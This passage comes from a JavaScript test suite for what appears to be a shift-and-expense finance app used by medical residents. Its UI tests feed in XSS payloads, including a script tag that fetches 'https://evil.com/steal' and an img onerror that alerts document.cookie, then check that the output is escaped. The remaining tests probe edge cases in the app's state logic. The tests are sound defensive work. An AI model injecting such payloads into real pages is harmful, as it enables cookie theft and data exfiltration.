      assert.ok(!incomeView.innerHTML.includes('<img src=x onerror="alert(document.cookie)">'));
    });

    test('UI renders without throwing when expense contains HTML tag injection in description', () => {
      const today = getLocalDateString();
      const xssDesc = '<script>fetch("https://evil.com/steal")</script> Livro Pediatria';
      uiStore.saveExpense({
        description: xssDesc,
        amount: 350.00,
        date: today,
        category: 'Estudo'
      });

      assert.doesNotThrow(() => {
        ui.switchTab('expenses');
      });

      const expensesView = domElements.get('view-expenses');
      assert.ok(expensesView.innerHTML.length > 0);
      // Remediated: raw payload is sanitized with escapeHtml (&lt;, &gt;, &quot;)
      assert.ok(expensesView.innerHTML.includes('&lt;script&gt;fetch(&quot;https://evil.com/steal&quot;)&lt;/script&gt;'));
      assert.ok(!expensesView.innerHTML.includes('<script>fetch("https://evil.com/steal")</script>'));
    });

    test('Toast notification renders safely and inserts notification into container', () => {
      const toastPayload = 'Alerta: <img src=x onerror=1> Plantão Confirmado!';
      assert.doesNotThrow(() => {
        ui.showToast(toastPayload, 'success');
      });

      const container = domElements.get('toast-container');
      assert.ok(container.children.length > 0);
    });

    test('Sync badge handles adversarial and undefined status transitions without crash', () => {
      assert.doesNotThrow(() => {
        ui.updateSyncBadge('guest');
        ui.updateSyncBadge('syncing');
        ui.updateSyncBadge('synced');
        ui.updateSyncBadge('offline');
        ui.updateSyncBadge('error', { message: '<script>alert(1)</script>' });
        ui.updateSyncBadge('unknown_weird_status');
      });
    });
  });

  // ==========================================================================
  // 10. STATE MACHINE & MUTATION GUARDRAILS
  // ==========================================================================
  describe('10. State Machine & Mutation Guardrails', () => {
    test('toggleShiftInstallment with invalid installment numbers (0, 3, -1, 999) does not throw and targets fallback', () => {
      const shift = store.saveShift({
        hospital: 'Maternidade Principal',
        netValue: 1200,
        date: '2026-03-01'
      });

      assert.equal(shift.installment2.status, 'pending');
      // Number 999 targets installment2 (due to ternary fallback)
      store.toggleShiftInstallment(shift.id, 999);
      assert.equal(store.data.shifts[0].installment2.status, 'received');

      // Toggling nonexistent shift returns null safely
      const nonExistent = store.toggleShiftInstallment('non_existent_id', 1);
      assert.equal(nonExistent, null);
    });

    test('deleteShift and deleteExpense are idempotent and handle nonexistent IDs as safe no-ops', () => {
      store.saveShift({ id: 's100', hospital: 'Maternidade Principal', netValue: 1000 });
      store.saveExpense({ id: 'e100', description: 'Gasto', amount: 50 });

      assert.equal(store.data.shifts.length, 1);
      assert.equal(store.data.expenses.length, 1);

      store.deleteShift('ghost_shift_id');
      store.deleteExpense('ghost_expense_id');

      assert.equal(store.data.shifts.length, 1);
      assert.equal(store.data.expenses.length, 1);

      store.deleteShift('s100');
      store.deleteExpense('e100');

      assert.equal(store.data.shifts.length, 0);
      assert.equal(store.data.expenses.length, 0);
    });

    test('updateResidencySalary handles negative values and string inputs safely', () => {
      store.updateResidencySalary({ value: '-1500', active: true, dayOfMonth: '10' });
      assert.equal(store.data.residencySalary.value, -1500);
      assert.equal(store.data.residencySalary.dayOfMonth, 10);

      // Calculation reflects negative residency income without NaN
      const summ = store.getMonthSummary('2026-03', 'caixa');
      assert.equal(summ.residencyIncome, -1500);
      assert.equal(summ.totalIncome, -1500);
    });

    test('getForecast6Months handles null, undefined and empty inputs by falling back to current local month', () => {
      const defaultForecast = store.getForecast6Months(null);
      assert.equal(defaultForecast.length, 6);
      assert.ok(defaultForecast[0].month.includes('-'));
      assert.ok(defaultForecast[0].income >= 0);

      const undefinedForecast = store.getForecast6Months(undefined);
      assert.equal(undefinedForecast.length, 6);
    });
  });
});
